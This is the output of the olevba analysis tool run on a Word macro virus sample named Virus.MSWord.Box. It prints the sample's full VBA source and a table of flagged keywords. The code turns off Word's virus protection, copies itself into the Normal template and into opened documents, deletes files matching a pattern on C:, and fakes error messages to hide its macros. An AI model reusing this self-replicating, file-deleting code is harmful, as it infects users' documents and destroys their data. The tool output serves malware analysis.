olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box-999c8f4ba26e6d0279f263fcbfce1f045c8fb949
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box-999c8f4ba26e6d0279f263fcbfce1f045c8fb949 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SLOT.bas 
in file: Virus.MSWord.Box-999c8f4ba26e6d0279f263fcbfce1f045c8fb949 - OLE stream: 'Macros/VBA/SLOT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoclose()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1"
exit_:
End Sub

Sub autoopen()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1.SK"
exit_:
End Sub


Sub box1()
ReDim nm__(2)
Dim monkey
Dim tog$
Dim i
Dim x
Dim a$
WordBasic.DisableInput 1
 
On Error Resume Next
If WordBasic.Day(WordBasic.Now()) <= WordBasic.Int(Rnd() * 30) Then GoTo exit_

slotgame:
On Error Resume Next
Err.Number = 0
monkey = -1
tog$ = ""
i = 0
While monkey = -1
For i = 0 To 2
nm__(i) = WordBasic.Int(Rnd() * 10)
If i = 2 Then
tog$ = tog$ + Str(nm__(2))
GoTo banana
End If
tog$ = tog$ + Str(nm__(i))
Next i
banana:
WordBasic.Beep

WordBasic.MsgBox "今天是 " + WordBasic.[Date$]() + " ,跟你玩一個SLOT的遊戲" + Chr(13) + _
" 試試你的手氣吧 !你這把的幸運號碼是. . . " + Chr(13) + _
tog$ + " ", "Macro Slot Game 4 for Word97"
If tog$ = Str(nm__(i)) + Str(nm__(i)) + Str(nm__(i)) Then
WordBasic.Beep

lucky7:
WordBasic.MsgBox " 咦.......你的手氣不錯喔! ", _
"Macro Slot Game 4 for Word97"
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Font:="細明體", Points:=64, Color:=2, Bold:=1, Underline:=1
WordBasic.Insert "嗯! 算 你 走 運 !!"
For x = 1 To 10
WordBasic.Beep
Next x
GoTo exit_

Else
WordBasic.Beep
On Error GoTo -1: On Error GoTo slotgame
Err.Number = 0
a$ = WordBasic.[InputBox$]("你的手氣太背了 ! 給你一個翻本的機會或是試試下一把吧 ! 請輸入三位數過關密碼  , 猜中了就保送你過關 ! 當然 !  你不猜也行 ! ", _
"Macro Slot Game 4 for Word97")
WordBasic.Beep
If a$ = "777" Then GoTo unlucky Else GoTo try
End If

try:
On Error Resume Next
Err.Number = 0
WordBasic.MsgBox " 這 樣 子 不 行 喔 !你 必 須 輸 入 正 確 的 密 碼 或 是 按 下 取 消 才 行 喔 ! ", _
"Macro Slot Game 4 for Word97"
GoTo slotgame
Wend


unlucky:

On Error Resume Next
WordBasic.MsgBox "OK ! Now We EXIT!", _
"Macro Slot Game 4 for Word97"

exit_:
End Sub


Sub SK()
Dim q$
SK:
WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.FileFind SearchPath:="c:\", Name:="z-macroc.*", SubDir:=1

q$ = WordBasic.[FoundFileName$](1)
If q$ = "" Then GoTo bye Else
WordBasic.Kill q$
If Err.Number = 0 Then
GoTo SK
Else
End If
WordBasic.MsgBox "目 標 檔 案 已 被 終 結 !!", "搜 尋 與 終 結 "
GoTo bye

exit_:
WordBasic.ExitWindows

bye:
End Sub


Sub toolsmacro()
Dim Pb

WordBasic.DisableInput 1
On Error Resume Next
WordBasic.BeginDialog 359, 271, "巨集"
    WordBasic.PushButton 234, 6, 120, 21, "錄製(O)...", "Push1"
    WordBasic.PushButton 234, 29, 120, 21, "取消", "Push2"
    WordBasic.PushButton 234, 55, 120, 21, "執行(R)", "Push3"
    WordBasic.PushButton 234, 79, 120, 21, "建立(E)", "Push4"
    WordBasic.PushButton 234, 103, 120, 21, "刪除(D)", "Push5"
    WordBasic.PushButton 234, 130, 120, 21, "  組合管理(G)...", "Push6"
    WordBasic.PushButton 234, 154, 120, 21, "說明(H)", "Push7"
    WordBasic.Text 10, 9, 96, 18, "巨集名稱(M):", "Text1"
    WordBasic.Text 10, 175, 112, 13, "巨集作用於(A):", "Text2"
    WordBasic.Text 10, 207, 64, 15, "說明(I):", "Text3"
    WordBasic.TextBox 11, 23, 213, 18, "TextBox5"
    WordBasic.TextBox 15, 42, 207, 129, "TextBox6", 1
    WordBasic.TextBox 11, 188, 340, 18, "TextBox3"
    WordBasic.TextBox 12, 223, 341, 39, "TextBox4", 1

WordBasic.EndDialog
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
Pb = WordBasic.Dialog.UserDialog(dlg)
If Pb = 2 Then GoTo bye
If Pb = 5 Then killer
If Pb = 6 Then killer
WordBasic.Beep
WordBasic.MsgBox "記憶體用完", "WordBasic Err =7", 32

bye:
End Sub

Sub killer()
On Error Resume Next
End Sub

Public Sub FileTemplates()
WordBasic.Beep
WordBasic.MsgBox "記憶體用完", "WordBasic Err =7", 48

End Sub

Public Sub autonew()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1"
exit_:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

